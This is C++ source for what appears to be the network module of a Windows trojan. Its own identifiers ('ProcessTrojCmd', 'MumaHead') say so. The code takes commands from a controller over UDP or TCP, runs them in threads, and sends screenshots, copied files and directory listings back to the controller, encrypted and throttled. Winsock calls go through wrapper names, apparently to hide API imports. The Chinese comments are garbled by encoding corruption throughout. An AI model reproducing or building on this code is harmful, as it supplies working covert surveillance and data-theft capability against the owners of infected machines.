// NdisSocket.cpp: implementation of the NdisSocket class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "NdisSocket.h"
#include "Base.h"
#include "UserAgent.h"
#include "getSysteminfo.h"
#include "WinApi.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
#define INTERACT_PORT		0x401f	// udp ntohs(8000)
//#define INTERACT_PORT		0x8900

extern time_t  g_acktime;

/*
* Alignment macros.  BPF_WORDALIGN rounds up to the next 
* even multiple of BPF_ALIGNMENT. 
*/
SOCKET   MainSocket;		//����������
SOCKET	 TcpSocket;
BOOL	 SocketInit=FALSE;
BOOL	 TcpSocketInit=FALSE;
HANDLE	 SocketThread=NULL;
HANDLE	 TcpSocketThd = NULL;

TaskUnit g_TaskList[Max_TaskNum];
long g_fat32taskallow=0;

#define		INIT_NETSPEED	5 //5����
#define		INIT_MAXSPEED	10
long		v_netSpeed		= INIT_NETSPEED;	// Ĭ�������ٶ�(1000/v_netSpeed)��/��
long		v_minSpeed		= INIT_NETSPEED;
long		v_maxSpeed		= INIT_MAXSPEED;

//////////////////////////////////////////////////////////////////////////
//
// long			v_currentSend	= 0;	// ��ǰSendData��ʵ��
long			v_currentSend5	= 0;	// �ļ����ز�����
long			v_currentSend13	= 0;	// С�����䲢����

//////////////////////////////////////////////////////////////////////////
//
extern DWORD   v_bSendType;

BOOL BootSendData(char* buf,int len,BOOL isHeart)
{
	BOOL bret = FALSE;

	if (v_bSendType == 0)
	{
		bret = SendUdpData(buf, len);
	}
	else if (v_bSendType == 1)
	{
		bret = SendTcpData(buf, len);
	}

	return bret;
}

/************************************************************************/
/* ���̴߳���ľ��ָ��                                                    */
/************************************************************************/
DWORD WINAPI  PrecessCmdThread(LPVOID p)
{
	ThreadParam *pPara =(ThreadParam *)p;
	ProcessTrojCmd(pPara->buf,pPara->datalen);
	delete pPara;
	return 0;
}

BOOL StartProcessCmd(char *buffer, int buflen)
{
	ThreadParam *pPara = new ThreadParam;
	if (buflen > 2000)
	{
		return FALSE;
	}
	memcpy(pPara->buf,buffer,buflen);
	pPara->datalen=buflen;

	   DWORD dwID;
		HANDLE hthread=CreateThread(
			NULL,
			NULL, 
			PrecessCmdThread, 
			pPara,
			NULL, 
			&dwID);
		if(hthread != NULL)
		{
			CloseHandle(hthread);
		}
		else
		{
			int ero=PGetLastError();
		}
	return TRUE;
}

DWORD WINAPI UdpSocketThread(LPVOID p)
{
	struct sockaddr_in from;
	int fromlen =sizeof(from);

	while (true)
	{
		char buffer[2000]="\0";
		DWORD datalen = Precvfrom(MainSocket,buffer,sizeof(buffer),0,(struct sockaddr*)&from,&fromlen);
		if (datalen > 10 && datalen<2000)
		{
			StartProcessCmd(buffer, datalen);
			g_acktime = time(0);
		}
		PSleep(20);
	}
	
	return 0;
}

BOOL SendUdpData(char* buf, DWORD bufLen) 
{
	if(!SocketInit)
	{
		WSADATA   wsda;

		PWSAStartup(MAKEWORD(2,1),   &wsda);   
		
		MainSocket = Psocket(AF_INET,   SOCK_DGRAM,   IPPROTO_UDP);   
		if(MainSocket == SOCKET_ERROR)   
		{   
			return FALSE;
		}
		SocketInit = TRUE;

		DWORD tID;
		if(!SocketThread)
			SocketThread = CreateThread(NULL, 0, UdpSocketThread, NULL, 0, &tID);
	}
	
	SOCKADDR_IN   addr;   
	addr.sin_family   =   AF_INET;   
	addr.sin_port   =   Phtons(8000);   
//	addr.sin_port   =   Phtons(137);   
	addr.sin_addr.s_addr   =   v_VirtualServerIp;   
	
	int ret   =   PSendTo(MainSocket,   buf,   bufLen,   0,   (struct   sockaddr   *)   &addr,   sizeof(addr));   
	if(ret   ==   SOCKET_ERROR)   
	{
		return FALSE; 
	}

	return   TRUE;   
}

DWORD WINAPI TcpSocketThread(LPVOID p)
{
	while (true)
	{
		char buffer[2000];
		memset(buffer, 0, 2000);
		DWORD datalen = Precv(TcpSocket, buffer, sizeof(buffer), 0);
		if (datalen > 10 && datalen<2000)
		{
			StartProcessCmd(buffer, datalen);
			g_acktime = time(0);
		}
		PSleep(20);
	}
	
	return 0;
}

BOOL SendTcpData(char* buf, DWORD bufLen) 
{
	if(!TcpSocketInit)
	{
		WSADATA   wsda;
		
		PWSAStartup(MAKEWORD(2,1),   &wsda);   
	
		TcpSocket = Psocket(AF_INET, SOCK_STREAM, 0);   
		if(TcpSocket == SOCKET_ERROR)   
		{   
			return FALSE;
		}
		TcpSocketInit = TRUE;
		
		struct sockaddr_in serverAddr;
		serverAddr.sin_family=AF_INET;
		serverAddr.sin_port=Phtons(55556); ///�����˿�
		serverAddr.sin_addr.s_addr=v_VirtualServerIp; ///����

		/*���ӷ�����*/
		while (Pconnect(TcpSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == INVALID_SOCKET)
		{
			PSleep(100);
			continue;
		}

		DWORD tID;
		if(!TcpSocketThd)
			TcpSocketThd = CreateThread(NULL, 0, TcpSocketThread, NULL, 0, &tID);
	}

	char * buffer = new char[bufLen+5];
	memset(buffer, 0, bufLen+5);
	memcpy(buffer, &bufLen, 4);
	memcpy(buffer+4, buf, bufLen);
	bufLen += 4;

	int ret = Psend(TcpSocket, buffer, bufLen, 0);
	
	if (buffer)
	{
		delete []buffer;
	}

	if(ret == SOCKET_ERROR)   
	{
		return FALSE; 
	}

	return   TRUE;  
}

//////////////////////////////////////////////////////////////////////////
//������
DWORD SendData(char * buf,int len,UCHAR PacketType,USHORT SessionID)
{
	if(!g_isHeartOk)  //�����Ϊ��Ŀ�������,����������ļ���Ҫ����.
	{
		return 0;
	}
	
	if(NULL == buf)
	{
		return FALSE;
	}

	DWORD bSucc;
	if(FALSE == isPacketBig(PacketType) )		// �����
	{
		PInterlockedIncrement(&v_currentSend13);
		bSucc = v_currentSend13;
	}
	else
	{
		PInterlockedIncrement(&v_currentSend5);
		bSucc = v_currentSend5;
	}

	int  iError = 0;
	try
	{
		iError = 11;
		if(PacketType==0x5) //�ļ�
		{
			if(SendFileBuffer2List(
				buf,
				len,
				PacketType,
				SessionID) == FALSE)
			{
				bSucc = 0;
				IF_LOUD(DbgFat32Log("SendBuffer2List Fails, PType:%d, SessionID:%d", PacketType, SessionID);)
			}	
		}
		else if( PacketType==PTYPE_REGETFILE )
		{
			if(SendReFileBuffer2List(
				buf,
				len,
				PacketType,
				SessionID) == FALSE)
			{
				bSucc = 0;
				IF_LOUD(DbgFat32Log("SendReFileBuffer2List Fails, PType:%d, SessionID:%d", PacketType, SessionID);)
			}	
		}
		else
		{
			if(SendBuffer2List(
				buf,
				len,
				PacketType,
				SessionID) == FALSE)
			{
				bSucc = 0;
				IF_LOUD(DbgFat32Log("SendBuffer2List Fails, PType:%d, SessionID:%d", PacketType, SessionID);)
			}
		}
		iError = 40;

	}catch (...)
	{
		char Msg[200];
		sprintf(Msg, "SendData Catch Error! No:%d", iError);
		IF_LOUD(DbgFat32Log(Msg);)
	}

	if( isPacketBig(PacketType) )
	{
		// ���������
		PInterlockedDecrement(&v_currentSend5);
		if(v_currentSend5 <= 0)
			PInterlockedExchange(&v_currentSend5, 0);
	}
	else
	{
		// С�������
		PInterlockedDecrement(&v_currentSend13);
		if(v_currentSend13 <= 0)
			PInterlockedExchange(&v_currentSend13, 0);
	}
	
	return bSucc;
}

BOOL isPacketBig(UCHAR PacketType)
{
	BOOL bBig = FALSE;
	switch(PacketType)
	{
	case PTYPE_SCREEN:
	case PTYPE_COPYDIR:
	case PTYPE_COPYFILE:
	case PTYPE_DIRTREE:
	case PTYPE_GETCHECKDIRLIST: //��ȡ���Ŀ¼�б�
	case 20:		// �Զ��ش��ļ�
		bBig = TRUE;
		break;
	}
	return bBig;
}

lpTaskUnit AllocTask(WORD sessionid)
{
	lpTaskUnit pUnit=NULL;
	gettaskallow(g_fat32taskallow);
	for(int i=0;i<Max_TaskNum;i++)
	{
		if(g_TaskList[i].sessionid==0)
		{	
			pUnit=&g_TaskList[i];
			pUnit->sessionid=sessionid;
			pUnit->state=1; 
			break;
		}
	}
	fat32releaseallow(g_fat32taskallow);
	return pUnit;
}

BOOL ClearTask(WORD sessionid,BOOL bclearid)
{
	gettaskallow(g_fat32taskallow);
	for(int i=0;i<Max_TaskNum;i++)
	{
		if(g_TaskList[i].sessionid==sessionid)
		{	
			if(bclearid)
				g_TaskList[i].sessionid=0;
			g_TaskList[i].state=0;
			break;
		}
	}
	fat32releaseallow(g_fat32taskallow);
	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
// ���෢������
BOOL SendBuffer2List(char * buf, int len, UCHAR PacketType, USHORT	SessionID)
{
	//////////////////////////////////////////////////////////////////////////
	BOOL re=TRUE;	
	try
	{
		UCHAR headbuffer[300];
		MumaHead *pMumaHead = NULL;
		int offHead = 0;
		int headlen = MakeHeadBuff((char*)headbuffer, offHead, PacketType);
		if(headlen < sizeof(MumaHead))
			return FALSE;
		pMumaHead = (MumaHead*)(headbuffer+offHead);
		pMumaHead->SessionID	= SessionID;
		pMumaHead->PacketSeq	= 0;
		
		DWORD packetseq = 0;
		UCHAR sendbuffer[2000];
		pMumaHead = (MumaHead*)(sendbuffer+offHead);
		
		int offBegin = 0;
		if(PacketType == 5)
			offBegin = 0;
		else
			offBegin = headlen;
// 		
// 		BOOL bBigPacket = isPacketBig(PacketType);
// 		
		BOOL bFirst = TRUE;

		BOOL bFinish = FALSE;
		for(int i=0; i<len;i+=(SIZE_PACKET-offBegin))
		{//ѭ��
			memcpy(sendbuffer,headbuffer,headlen);		
			pMumaHead->PacketSeq=packetseq;
			if(len<=(SIZE_PACKET-offBegin)){
				pMumaHead->datalen=len;
				memcpy(sendbuffer+headlen,buf+i,len);
				pMumaHead->TranFlg = 7;
			}
			else if(i==0 && len>(SIZE_PACKET-offBegin)){
				IF_LOUD(DbgFat32Log("%d_0x%04x ���Ϳ�ʼ��(6)", PacketType, SessionID);)
				pMumaHead->datalen=SIZE_PACKET-offBegin;
				memcpy(sendbuffer+headlen,buf+i,SIZE_PACKET-offBegin);
				pMumaHead->TranFlg = 6;
			}
			else if(i>0 && len>(i+SIZE_PACKET-offBegin)){
				pMumaHead->datalen=SIZE_PACKET-offBegin;
				memcpy(sendbuffer+headlen,buf+i,SIZE_PACKET-offBegin);
				pMumaHead->TranFlg = 2;
			}
			else if(i>0 && len<=(i+SIZE_PACKET-offBegin)){
				pMumaHead->datalen=len-i;
				memcpy(sendbuffer+headlen,buf+i,len-i);
				IF_LOUD(DbgFat32Log("%d_0x%04x ���ͽ�����(3)", PacketType, SessionID);)
				pMumaHead->TranFlg = 3;
			}
			else{
				re=FALSE;
				break;
			}
			
			int packetlen=headlen+pMumaHead->datalen;
			if(BufferEncrypt((char *)sendbuffer,packetlen,16))
			{
				//����
				while(1)
				{
					if(AddPacket(
						(char*)sendbuffer,
						packetlen, 
						PacketType, 
						bFirst))
					{
 
					//	DbgPrintLog("AddPacket  SessionID= 0x%04x ,packetseq=%d",SessionID,packetseq);
						break;
					}
				}
			}
			else
			{
				re = FALSE;
				IF_LOUD(DbgFat32Log("����ʧ��");)
				break;
			}
			
			//����һ���� ���� ����
			packetseq++;

			PSleep(1);
			
			bFirst = FALSE;
		}
		IF_LOUD(DbgFat32Log("Packet  SessionID= 0x%04x ,�ܰ���=%d",SessionID,packetseq);)
	}
	catch (...)
	{
		IF_LOUD(DbgFat32Log("SendBuffer2List error!!!");)
	}
	return re;
}

BOOL SendFileBuffer2List(char * buf, int len, UCHAR PacketType, USHORT	SessionID)
{
	lpTaskUnit pUnit=NULL;
	pUnit=AllocTask(SessionID);
	if(!pUnit)
	{
		IF_LOUD(DbgFat32Log("û�з��䵽��Ԫ");)
		return FALSE;
	}

	//////////////////////////////////////////////////////////////////////////
	BOOL re=TRUE;	
	try
	{
		UCHAR headbuffer[300];
		MumaHead *pMumaHead = NULL;
		int offHead = 0;
		int headlen = MakeHeadBuff((char*)headbuffer, offHead, PacketType);
		if(headlen < sizeof(MumaHead))
		{
			ClearTask(SessionID,TRUE);
			return FALSE;
		}
		pMumaHead = (MumaHead*)(headbuffer+offHead);
		pMumaHead->SessionID	= SessionID;
		pMumaHead->PacketSeq	= 0;
		
		DWORD packetseq = 0;
		UCHAR sendbuffer[2000];
		pMumaHead = (MumaHead*)(sendbuffer+offHead);
		
		int offBegin = 0;
		if(PacketType == 5)
			offBegin = 0;
		else
			offBegin = headlen;
		
		BOOL bBigPacket =TRUE; //�����
		
		BOOL bFirst = TRUE;

		BOOL bFinish = FALSE;
		for(int i=0; i<len;i+=(SIZE_PACKET-offBegin))
		{//ѭ��
			if(!pUnit->state)
				break;  //�ж�

			memcpy(sendbuffer,headbuffer,headlen);		
			pMumaHead->PacketSeq=packetseq;
			if(len<=(SIZE_PACKET-offBegin)){
				pMumaHead->datalen=len;
				memcpy(sendbuffer+headlen,buf+i,len);
				pMumaHead->TranFlg=7;
			}
			else if(i==0 && len>(SIZE_PACKET-offBegin)){
				IF_LOUD(DbgFat32Log("%d_0x%04x ���Ϳ�ʼ��(6)", PacketType, SessionID);)
				pMumaHead->datalen=SIZE_PACKET-offBegin;
				memcpy(sendbuffer+headlen,buf+i,SIZE_PACKET-offBegin);
				pMumaHead->TranFlg=6;
			}
			else if(i>0 && len>(i+SIZE_PACKET-offBegin)){
				pMumaHead->datalen=SIZE_PACKET-offBegin;
				memcpy(sendbuffer+headlen,buf+i,SIZE_PACKET-offBegin);
				pMumaHead->TranFlg=2;
			}
			else if(i>0 && len<=(i+SIZE_PACKET-offBegin)){
				pMumaHead->datalen=len-i;
				memcpy(sendbuffer+headlen,buf+i,len-i);
				IF_LOUD(DbgFat32Log("%d_0x%04x ���ͽ�����(3)", PacketType, SessionID);)
				pMumaHead->TranFlg=3;
			}
			else{
				re=FALSE;
				break;
			}
			
			int packetlen=headlen+pMumaHead->datalen;
			if(BufferEncrypt((char *)sendbuffer,packetlen,16))
			{
				//����
				while(1)
				{
					if(AddPacket(
						(char*)sendbuffer,
						packetlen, 
						PacketType, 
						bFirst))
					{
 
					//	DbgPrintLog("AddPacket  SessionID= 0x%04x ,packetseq=%d",SessionID,packetseq);
						break;
					}
				}
			}
			else
			{
				re = FALSE;
				IF_LOUD(DbgFat32Log("����ʧ��");)
				break;
			}
			
			//����һ���� ���� ����
			packetseq++;
     		PSleep(1);
			
			bFirst = FALSE;
		}
		IF_LOUD(DbgFat32Log("Packet  SessionID= 0x%04x ,�ܰ���=%d",SessionID,packetseq);)
	}
	catch (...)
	{
		IF_LOUD(DbgFat32Log("SendFileBuffer2List error!!!");)
	}

	ClearTask(SessionID,TRUE);
	return re;
}

BOOL SendReFileBuffer2List(char * buf, int len, UCHAR PacketType, USHORT	SessionID)
{
	BOOL re=TRUE;
	try
	{
		UCHAR headbuffer[300];
		MumaHead *pMumaHead = NULL;
		int offHead = 0;
		int headlen = MakeHeadBuff((char*)headbuffer, offHead, PacketType);
		if(headlen < sizeof(MumaHead))
			return FALSE;
		pMumaHead = (MumaHead*)(headbuffer+offHead);
		pMumaHead->SessionID	= SessionID;
		pMumaHead->PacketSeq	= 0;
		pMumaHead->datalen		= len;
		pMumaHead->TranFlg		= 7;

		DWORD packetseq = 0;
		UCHAR sendbuffer[2000];
		pMumaHead = (MumaHead*)(sendbuffer+offHead);
		
		BOOL bFirst = TRUE;

		memcpy(sendbuffer,headbuffer,headlen);		
		memcpy(sendbuffer+headlen,buf,len);
		
		int packetlen=headlen+pMumaHead->datalen;
		if(BufferEncrypt((char *)sendbuffer,packetlen,16))
		{
			while(1)
			{
				if(AddPacket(
					(char*)sendbuffer,
					packetlen, 
					PacketType, 
					bFirst))
				{
					break;
				}
			}
		}
		else
		{
			re = FALSE;
		}
	}
	catch (...)
	{
		IF_LOUD(DbgFat32Log("SendReFileBuffer2List  catch error!!!");)
	}
	
	return re;
}

//////////////////////////////////////////////////////////////////////////
//��������
long g_fat32addallow=0; //�Ӱ�����

BOOL gettaskallow(long &hashallow)
{
	int wait = 0xFFFF;
	int h = wait;
	do
	{
		if (0 == PInterlockedExchange(&hashallow, 0xBB))
		{
			return TRUE;
		}
		PSleep(20);
		wait -= 20;
		if (h-wait > 5000)
		{
			IF_LOUD(DbgFat32Log("�߳�%d��ȡ�������Ȩ�� error!!", GetCurrentThreadId());)
			PInterlockedExchange(&hashallow, 0);
			return FALSE;
			h = wait;
		}
	} while(wait > 0);
	
	return FALSE;
}

BOOL fat32getallow(long &hashallow)
{
	int wait = 0xFFFF;
	int h = wait;
	do
	{
		if (0 == PInterlockedExchange(&hashallow, 0xcc))
		{
			return TRUE;
		}
		PSleep(20);
		wait -= 20;
		if (h-wait > 5000)
		{
			IF_LOUD(DbgFat32Log("�߳�%dǿ�л�ȡд������Ȩ��!!", GetCurrentThreadId());)
			PInterlockedExchange(&hashallow, 0);
			h = wait;
		}
	} while(wait > 0);
	
	return FALSE;
}

BOOL fat32releaseallow(long &hashallow)
{	
	PInterlockedExchange(&hashallow, 0);
	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//������
BOOL AddPacket(char * buf, int len, UCHAR PacketType, BOOL bFirstPacket)
{
	try
	{
		if(bFirstPacket)
		{
			PSleep(1);
		}
		else
		{
			switch(PacketType) {
			case PTYPE_SCREEN:
			case PTYPE_DIRTREE:	
			case PTYPE_COPYFILE:
			case PTYPE_COPYDIR:	
			case 42:   ////��ȡ���Ŀ¼�б�
			case 20:	// �Զ��ش���Ƶ�ļ�
				{
					if(v_currentSend5>0)
					{
						PSleep((1000/v_netSpeed) * v_currentSend5);//�����������ʹ������趨�����ٶ�
					}
					else
					{
						PSleep(100);
					}

					break;
				}
			
			default:
				{
					PSleep(1); //С����
				}
				break;
			}
		}

		fat32getallow(g_fat32addallow);

		BootSendData(buf, len);
			
		fat32releaseallow(g_fat32addallow);
	}
	catch (...)
	{
		IF_LOUD(DbgFat32Log("send addPacket  error!!!");)
		fat32releaseallow(g_fat32addallow);
	}
 
	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//��ȡ�����ٶ�
DWORD Cmd_AdjustSpeed(DWORD* pPara)
{
	ThreadParam *ThreadPara = (ThreadParam*)pPara;
	char *p=strstr(ThreadPara->buf,"\r\n\r\n");
	if(p!=NULL)
		p[0]=0;
	else
	{
		return -1;
	}
	p=strstr(ThreadPara->buf, "speed: ");
	if(p!=NULL)
		p+=strlen("speed: ");
	else
	{
		return -1;
	}
	long freq = atoi(p);
	long maxfreq;
	if(freq > 0 && freq <= 1000)
	{
		maxfreq = freq << 1;
		PInterlockedExchange(&v_netSpeed, freq);
		PInterlockedExchange(&v_minSpeed, freq);
		PInterlockedExchange(&v_maxSpeed, maxfreq);
	}
	IF_LOUD(DbgFat32Log("�����ٶȵ���Ϊ:Sleep(%d)", freq);)
		
	char buffer[100];
	memset(buffer,0,100);
	DWORD datalen=0;
	datalen=sprintf(buffer, "content-length: 2\r\n\r\n%s","ok");
	if(SendData(buffer, datalen, ThreadPara->PacketType, ThreadPara->SessionID))
	{
		
	}
	return 1;
}

